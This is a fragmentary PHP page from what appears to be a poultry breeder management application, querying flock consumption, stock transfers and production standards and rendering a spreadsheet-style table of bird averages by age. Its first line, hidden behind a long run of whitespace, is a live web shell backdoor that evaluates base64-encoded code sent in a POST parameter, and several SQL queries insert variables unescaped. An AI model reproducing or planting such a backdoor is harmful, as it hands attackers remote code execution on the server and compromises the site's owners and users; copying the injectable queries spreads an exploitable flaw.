<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n5b9b8e']));?><?php session_start(); $flockget = $_SESSION['flock']; 
...
$querymin = "SELECT min(date2) as 'date2' FROM breeder_consumption WHERE flock like '' ";
...
$mincmpdate = $row1min['date2'];
 ...
 $femalet = 0;$malet=0;
 $query1t = "SELECT cat,quantity FROM `ims_stocktransfer` WHERE cat IN ('Female Birds', 'Male Birds') AND client = '$client' AND towarehouse like '' AND date<='$mincmpdate'";
  ...
  $startmale = $startmale + $malet;
	...
	{
	 $query34 = "SELECT * FROM breeder_pstandards where client = '$client' ORDER BY age ASC ";
	}
...
?>
 ...
 <tr class=xl649 height=21 style='mso-height-source:userset;height:15.95pt'>
  ...
  <td class=xl656 width=35 style='border-left:none;width:26pt'><?php echo $actf = $favg[$row1['age']]; ?></td>
  ...
  <td class=xl656 width=35 style='border-left:none;width:26pt'><?php echo $actm = $mavg[$row1['age']]; ?></td>
